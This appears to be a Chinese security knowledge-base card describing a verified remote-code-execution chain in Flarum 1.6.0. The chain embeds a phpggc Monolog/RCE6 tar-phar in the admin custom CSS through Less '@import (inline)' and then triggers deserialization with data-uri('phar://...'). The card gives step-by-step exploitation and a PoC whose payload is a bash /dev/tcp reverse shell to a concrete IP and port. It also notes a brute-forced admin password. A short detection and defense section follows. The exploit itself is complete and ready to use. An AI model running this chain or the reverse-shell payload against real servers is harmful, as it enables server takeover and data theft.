---
id: web-php-rce-flarum-custom-css-phar-monolog-rce
title: Flarum 后台自定义 CSS 写入 Phar 载荷并 data-uri(phar://) 触发反序列化：phpggc tar 格式 Monolog/RCE6 反弹 Shell（1.6.0 实测）
type: scenario
domain: web
path: web/php/rce
technique: flarum-custom-css-phar-deserialization-rce
tags:
- php
- flarum
- cms
- phar
- deserialization
- less
- css
- phpggc
- monolog
- rce
- backend
cve: []
severity: high
confidence: high
affected_versions: Flarum 1.6.0（原文实测环境）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V566
  verified_at: '2026-11-12T09:17:04+08:00'
  notes: 已对照原文 35 张图核对：图03 Burp 爆破请求口令 admin888（正文文字写 1chris，与截图不一致，卡片采用截图值）、图04 后台显示 Flarum 1.6.0/PHP 7.4.33/MySQL 8.0.33、图05 phpggc -p tar -b Monolog/RCE6 命令、图06-09 自定义 CSS @import (inline) data:text/css;base64 与 data-uri("phar://./assets/forum.css")、图08 forum.css 中可见 Monolog\Handler\BufferHandler 序列化内容、图10 反弹 Shell。技术点/参数/PoC 与原文及截图一致。affected_versions 为原文实测环境版本，原文未给受影响区间。dedup top 为通用 phar 上传+回读与 Showdoc/Laravel Monolog 卡，产品、入口与触发 sink 均不同，非同链；dup-scan 无涉及 pair。未验证点：未复现。
url: /docs/web/php/rce/web-php-rce-flarum-custom-css-phar-monolog-rce/
draft: false
kb_aliases:
- Flarum RCE
- Flarum 自定义 CSS getshell
- Flarum phar 反序列化
- data-uri phar://
- Monolog/RCE6
- phpggc tar phar
- Flarum 1.6.0 RCE
---

## 一句话结论

Flarum 管理员可在后台「外观 → 自定义 CSS」写入 Less：先用 `@import (inline) 'data:text/css;base64,<phpggc tar phar>'` 把 Phar 反序列化载荷原样内联进编译产物 `assets/forum.css`，再用 `.test { content: data-uri("phar://./assets/forum.css"); }` 让 Less 编译器以 `phar://` 打开该文件，触发 Phar 元数据反序列化（phpggc `Monolog/RCE6`），执行系统命令获得反弹 Shell。

## 原理

- **Flarum 自定义 CSS 由 Less 编译**：后台保存的 Less/CSS 会被编译并写入可公开访问的 `assets/forum.css`；`@import (inline)` 不解析内容而是把目标内容原样拼接进产物，因此可以用 `data:text/css;base64,...` 把任意二进制（Phar 文件）注入编译结果。
- **Phar 反序列化**：PHP 的 `phar://` 流包装器在打开 phar 文件时会读取其 manifest 中的序列化元数据并触发 `unserialize`（无需 `unserialize()` 调用）。phpggc 的 `-p tar` 生成 tar 格式 phar，避开 phar 对 stub/文件结构的限制，适合作为“多格式”载荷塞进 CSS。
- **触发点**：Less 编译器的 `data-uri()` 函数会对参数执行 `file_get_contents`/MIME 探测；参数为 `phar://./assets/forum.css` 时，PHP 以 phar 流打开刚生成的 CSS 文件，元数据反序列化即发生。Monolog/RCE6 链在 classpath 中可用时执行 `system`/命令。
- **权限前提**：自定义 CSS 是管理员功能，因此本漏洞是“后台管理员 → 服务器 RCE”的权限提升链；原文通过首页泄露的管理员邮箱 + 弱口令爆破获得管理员会话。
- **为什么能稳定落地**：载荷先写文件再触发，两次请求分离；`assets/forum.css` 路径可预测，编译产物可先访问确认 Phar 字节已写入，再发第二条 CSS 触发。

## 触发条件

- 目标为存在该 Less/phar 行为的 Flarum 版本（原文 Flarum 1.6.0，PHP 7.4.33）。
- 攻击者拥有管理员会话（弱口令、凭据复用、其他后台漏洞）。
- `assets/` 可写且 Less 编译正常；phpggc 对应 gadget（Monolog）在 vendor 中存在。
- 服务器可出网（反弹 Shell）或命令执行结果可外带。

## 利用步骤

1. 用 phpggc 生成 tar 格式、base64 输出的 Monolog/RCE6 载荷：
   ```bash
   php -d phar.readonly=0 phpggc -p tar -b Monolog/RCE6 system "bash -c 'bash -i >& /dev/tcp/<VPS>/<PORT> 0>&1'"
   ```
2. 登录 Flarum 后台 → 外观 → 自定义 CSS/自定义样式 → 编辑自定义 CSS，写入：
   ```less
   @import (inline) 'data:text/css;base64,<上一步 base64>';
   ```
   保存。
3. 访问 `http(s)://target/assets/forum.css`，确认 Phar 字节（可见序列化字符串如 `Monolog\Handler\BufferHandler`）已写入。
4. 再次编辑自定义 CSS，改为触发规则：
   ```less
   .test { content: data-uri("phar://./assets/forum.css"); }
   ```
   保存，Less 编译时触发 `phar://` 反序列化。
5. 在 VPS 监听端口收到反弹 Shell（原文 www-data 权限）。

## PoC

```bash
# 生成载荷（tar 格式 phar，base64）
php -d phar.readonly=0 phpggc -p tar -b Monolog/RCE6 system "bash -c 'bash -i >& /dev/tcp/119.3.215.198/7776 0>&1'"
```

```less
/* 第一步：把 phar 原样内联进编译后的 forum.css */
@import (inline) 'data:text/css;base64,<base64>';

/* 第二步：让 Less 以 phar:// 打开 forum.css 触发反序列化 */
.test { content: data-uri("phar://./assets/forum.css"); }
```

原文实测：`/assets/forum.css` 中出现 `phar://...Monolog\Handler\BufferHandler...` 序列化内容；第二条 CSS 保存后在监听端收到 Shell。若目标禁用 `phar://` 或 Monolog 链不可用，需要换其他 gadget 或触发点。

## 变体与关联

- phpggc 链可替换为其他可用 gadget（Laravel/Symfony/Guzzle 等，取决于 Flarum vendor 依赖）；格式也可用 phar（非 tar）但在 CSS 内联场景 tar 更稳定。
- 触发函数可换其他会打开 URL 的 Less/媒体处理函数（`data-uri`、`url` 相关编译处理）；本质是“管理员可控文件内容 + phar:// 打开”。
- 前置弱口令：原文通过首页 `administrator@xiaorang.lab` 邮箱识别管理员账号并爆破出 `admin888`；该步骤为通用弱口令，不单独建卡。
- 后台管理员到 RCE 的类似思路：CMS 主题/模板编辑、语言包安装等（见 Joomla 卡），Flarum 的独特处是 Less `@import inline` + `data-uri(phar://)`。

## 检测与防御

- 升级 Flarum 到修复版本；限制自定义 CSS 的 `@import`/`data-uri` 对非 http(s) 协议与 data URI 的使用。
- 在 PHP 层禁用/限制 `phar://` 流（如 `stream_wrapper_unregister('phar')`），或对 Less 编译进程禁用危险函数。
- 后台强口令与最小权限；监控 `assets/forum.css` 被写入非 CSS 二进制、`phar://` 字符串、Monolog 序列化特征。
- 日志排查：短时间两次修改自定义 CSS、访问 `/assets/forum.css` 后紧跟异常出站连接/子进程（www-data 启动 bash）。
